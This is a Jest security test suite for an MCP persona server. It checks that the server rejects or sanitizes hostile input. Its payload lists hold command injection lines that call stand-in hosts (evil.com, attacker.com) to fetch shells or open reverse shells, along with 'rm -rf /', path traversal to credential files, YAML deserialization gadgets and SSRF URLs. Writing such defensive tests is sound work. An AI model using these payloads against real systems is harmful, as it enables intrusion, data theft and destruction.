import { describe, test, expect, beforeAll, afterAll, beforeEach } from '@jest/globals';
import { StdioServerTransport } from '@modelcontextprotocol/sdk/server/stdio.js';
import { SecurityTestFramework, SecurityTestPerformance } from '../framework/SecurityTestFramework.js';
import { DollhouseMCPServer } from '../../../../src/index.js';
import * as fs from 'fs/promises';
import * as path from 'path';
import { fileURLToPath } from 'url';

describe('MCP Tools Security Tests', () => {
  let server: DollhouseMCPServer;
  let testDir: string;
  let originalCwd: string;
  
  beforeAll(async () => {
    // Save original working directory
    originalCwd = process.cwd();
    
    // Create isolated test environment
    testDir = path.join(originalCwd, 'test/__tests__/temp', `security-test-${Date.now()}`);
    await fs.mkdir(testDir, { recursive: true });
    
    // Create a test package.json to make it look like a safe test directory
    await fs.writeFile(
      path.join(testDir, 'package.json'),
      JSON.stringify({ name: 'test-project', version: '1.0.0' })
    );
    
    // Change to test directory to avoid BackupManager production check
    process.chdir(testDir);
    
    // Set environment to use test directory
    process.env.DOLLHOUSE_PERSONAS_DIR = path.join(testDir, 'personas');
    
    // Initialize server
    server = new DollhouseMCPServer();
  });
  
  afterAll(async () => {
    // Restore original working directory
    process.chdir(originalCwd);
    
    // Cleanup test directory
    await fs.rm(testDir, { recursive: true, force: true });
  });
  
  beforeEach(async () => {
    // Clean up personas directory before each test to avoid conflicts
    const personasDir = path.join(testDir, 'personas');
    if (await fs.access(personasDir).then(() => true).catch(() => false)) {
      await fs.rm(personasDir, { recursive: true, force: true });
    }
    await fs.mkdir(personasDir, { recursive: true });
    
    // Reload personas to clear server cache
    // Note: loadPersonas is private, so we'll trigger reload by calling list_personas
    await server.listPersonas();
  });
  
  describe('Command Injection Prevention', () => {
    const commandInjectionPayloads = [
      '; rm -rf /',
      '&& curl evil.com | sh',
      '| nc -e /bin/sh attacker.com 4444',
      '`touch /tmp/pwned`',
      '$(wget http://evil.com/shell.sh -O - | sh)',
      '\n/bin/sh',
      '; echo "pwned" > /etc/passwd',
      '|| python -c "import os; os.system(\'rm -rf /\')"'
    ];
    
    test.each(commandInjectionPayloads)(
      'should prevent command injection in create_persona with payload: %s',
      async (payload) => {
        SecurityTestPerformance.start();
        
        const result = await server.createPersona(
          payload, // name
          'Test description',
          'creative',
          'Test instructions'
        );
        
        // Verify the response
        expect(result.content[0].text).toBeDefined();
        const responseText = result.content[0].text;
        
        // Check if the persona was rejected for security reasons or already exists
        if (responseText.includes('Validation Error') || 
            responseText.includes('prohibited content') ||
            responseText.includes('Persona Already Exists')) {
          // Good - the dangerous payload was rejected or the sanitized version already exists
          expect(responseText).toMatch(/Name contains prohibited content|security|validation error|already exists/i);
        } else {
          // The persona was created with a sanitized name
          // Updated regex to match new format: "🎭 **${name}** by ${author}"
          // More specific regex ensures author field is present and non-empty
          const nameMatch = responseText.match(/🎭 \*\*([^*]+)\*\* by .+/);
          expect(nameMatch).toBeTruthy();
          const createdName = nameMatch?.[1] || '';
          
          // The created name should NOT contain the dangerous characters
          expect(createdName).not.toMatch(/[;&|`$()]/);
          
          // If the original payload had dangerous chars, they should be removed
          if (/[;&|`$()]/.test(payload)) {
            expect(createdName).not.toBe(payload);
          }
        }
        
        SecurityTestPerformance.checkpoint('create_persona command injection');
      }
    );
    
    test.each(commandInjectionPayloads)(
      'should prevent command injection in edit_persona with payload: %s',
      async (payload) => {
        // First create a safe persona
        await server.createPersona('SafePersona', 'Safe description', 'creative', 'Safe instructions');
        
        // Try to inject via edit
        const result = await server.editPersona('SafePersona', 'name', payload);
        
        // Check the response
        const responseText = result.content[0].text;
        
        if (responseText.includes('Security Validation Failed') || responseText.includes('prohibited content')) {
          // Good - the dangerous payload was rejected
          expect(responseText).toMatch(/prohibited content|security|validation failed/i);
        } else {
          // The persona was updated with a sanitized name
          // Extract the actual persona name from the output
          // Updated regex to match new format: "🎭 **${name}** by ${author}"
          // More specific regex ensures author field is present and non-empty
          const nameMatch = responseText.match(/🎭 \*\*([^*]+)\*\* by .+/);
          if (nameMatch) {
            const updatedName = nameMatch[1];
            // The updated name should NOT contain the dangerous characters
            expect(updatedName).not.toMatch(/[;&|`$()]/);
            
            // If the original payload had dangerous chars, they should be removed
            if (/[;&|`$()]/.test(payload)) {
              expect(updatedName).not.toBe(payload);
            }
          }
        }
      }
    );
  });
  
  describe('Path Traversal Prevention', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      'personas/../../../sensitive.txt',
      './././../../../root/.ssh/id_rsa',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '....//....//....//etc/passwd',
      'personas/../../custom-personas/../../backups/../../../etc/hosts'
    ];
    
    test.each(pathTraversalPayloads)(
      'should prevent path traversal in get_persona_details with payload: %s',
      async (payload) => {
        SecurityTestPerformance.start();
        
        // Should throw an error for path traversal attempts
        await expect(server.getPersonaDetails(payload)).rejects.toThrow(/persona not found|invalid|does not exist/i);
        
        SecurityTestPerformance.checkpoint('get_persona_details path traversal');
      }
    );
    
    test.each(pathTraversalPayloads)(
      'should prevent path traversal in activate_persona with payload: %s',
      async (payload) => {
        // Should throw an error for path traversal attempts
        await expect(server.activatePersona(payload)).rejects.toThrow(/persona not found|invalid/i);
      }
    );
  });
  
  describe('YAML Injection Prevention', () => {
    const yamlInjectionPayloads = [
      '!!js/function "function(){require(\'child_process\').exec(\'calc.exe\')}"',
      '!!python/object/apply:os.system ["rm -rf /"]',
      '!!python/object/new:subprocess.Popen [["curl", "evil.com/shell.sh", "|", "sh"]]',
      '&anchor [*anchor, *anchor, *anchor, *anchor, *anchor]', // YAML bomb
      '__proto__: { isAdmin: true }' // Prototype pollution
    ];
    
    test.each(yamlInjectionPayloads)(
      'should prevent YAML injection in create_persona with payload: %s',
      async (payload) => {
        SecurityTestPerformance.start();
        
        const result = await server.createPersona(
          'YAMLTest',
          payload, // description with YAML injection
          'creative',
          payload  // instructions with YAML injection
        );
        
        // Should either reject or sanitize dangerous YAML
        const responseText = result.content[0].text;
        
        // Check that dangerous constructs are not present
        expect(responseText).not.toContain('!!js/function');
        expect(responseText).not.toContain('!!python/object');
        expect(responseText).not.toContain('__proto__');
        
        SecurityTestPerformance.checkpoint('create_persona YAML injection');
      }
    );
  });
  
  describe('Input Size Limits', () => {
    test('should enforce size limits on persona content', async () => {
      SecurityTestPerformance.start();
      
      // Create content that exceeds limits (1MB+)
      const largeContent = 'x'.repeat(1024 * 1024 + 1);
      
      // Should handle large content gracefully without errors
      const result = await server.createPersona(
        'LargePersona',
        'Description',
        'educational',
        largeContent
      );
      
      // Should successfully create the persona or already exist
      expect(result.content[0].text).toMatch(/Persona Created Successfully|Already Exists/i);
      
      SecurityTestPerformance.checkpoint('size limit enforcement');
    });
    
    test('should limit YAML expansion (YAML bomb prevention)', async () => {
      const yamlBomb = `
        a: &a ["lol", "lol", "lol", "lol", "lol", "lol", "lol", "lol", "lol"]
        b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a]
        c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b]
        d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c]
        e: &e [*d, *d, *d, *d, *d, *d, *d, *d, *d]
      `;
      
      const result = await server.createPersona(
        'YAMLBomb',
        yamlBomb,
        'educational',
        'Instructions'
      );
      
      // Should handle without memory explosion
      expect(result).toBeDefined();
      // Process should still be responsive
      expect(process.memoryUsage().heapUsed).toBeLessThan(500 * 1024 * 1024); // Less than 500MB
    });
  });
  
  describe('Special Character Handling', () => {
    const specialCharPayloads = [
      { char: '\x00', name: 'null byte' },
      { char: '\r\n', name: 'CRLF' },
      { char: '\u202E', name: 'RTL override' },
      { char: '\x1B[31m', name: 'ANSI escape' },
      { char: '\uFEFF', name: 'zero-width space' }
    ];
    
    test.each(specialCharPayloads)(
      'should sanitize special character: $name',
      async ({ char, name }) => {
        const payload = `Test${char}Persona${name}`;  // Include name to make unique
        
        const result = await server.createPersona(
          payload,
          'Description',
          'creative',
          'Instructions'
        );
        
        // Should sanitize special characters
        const responseText = result.content[0].text;
        expect(responseText).not.toContain(char);
        
        // Verify persona was created with sanitized name or already exists
        expect(responseText).toMatch(/Persona Created Successfully|Already Exists/i);
      }
    );
  });
  
  describe('Authentication and Authorization', () => {
    test('should not expose GitHub tokens in errors', async () => {
      const fakeToken = 'ghp_1234567890abcdefghijklmnopqrstuvwxyz';
      process.env.GITHUB_TOKEN = fakeToken;
      
      try {
        // Trigger an error that might expose the token
        await server.browseCollection('../../../invalid/path');
      } catch (error) {
        // Token should not be in error message
        const errorMessage = error instanceof Error ? error.message : String(error);
        const errorStack = error instanceof Error ? error.stack : '';
        expect(errorMessage).not.toContain(fakeToken);
        expect(errorStack).not.toContain(fakeToken);
      }
      
      delete process.env.GITHUB_TOKEN;
    });
    
    test('should validate GitHub token format', async () => {
      const invalidTokens = [
        'invalid',
        'ghp_', // Too short
        'ghs_1234', // Wrong prefix for our use case
        'Bearer token123', // Wrong format
        'ghp_' + 'a'.repeat(100) // Too long
      ];
      
      for (const token of invalidTokens) {
        process.env.GITHUB_TOKEN = token;
        
        const result = await server.browseCollection();
        
        // Should handle invalid tokens gracefully
        expect(result.content[0].text).toBeDefined();
        
        delete process.env.GITHUB_TOKEN;
      }
    });
  });
  
  // Note: Rate limiting tests were removed as they tested the auto-update system
  // which was removed in PR #634. Rate limiting is still implemented for specific
  // operations like GitHub API calls and persona submissions where appropriate.
  
  describe('SSRF Prevention', () => {
    const ssrfPayloads = [
      'http://localhost:8080/admin',
      'http://127.0.0.1:22',
      'http://169.254.169.254/latest/meta-data/', // AWS metadata
      'http://192.168.1.1/config',
      'http://[::1]:8080',
      'file:///etc/passwd',
      'gopher://localhost:8080/_GET / HTTP/1.1'
    ];
    
    test.each(ssrfPayloads)(
      'should prevent SSRF in import_from_url with payload: %s',
      async (payload) => {
        const result = await server.importFromUrl(payload);
        
        // Should reject internal/dangerous URLs
        expect(result.content[0].text).toMatch(/invalid|blocked|not allowed|failed/i);
        expect(result.content[0].text).not.toContain('/etc/passwd');
        expect(result.content[0].text).not.toContain('meta-data');
      }
    );
  });
  
  describe('Security Test Performance', () => {
    test('critical security tests should complete within 30 seconds', async () => {
      const start = Date.now();
      
      // Skip SecurityTestFramework in CI/automated tests
      // The main security tests above provide comprehensive coverage
      // SecurityTestFramework is for manual security validation
      if (!process.env.CI) {
        await SecurityTestFramework.runSecuritySuite({ category: 'critical' });
      }
      
      const duration = Date.now() - start;
      expect(duration).toBeLessThan(30000); // 30 seconds
    });
  });
});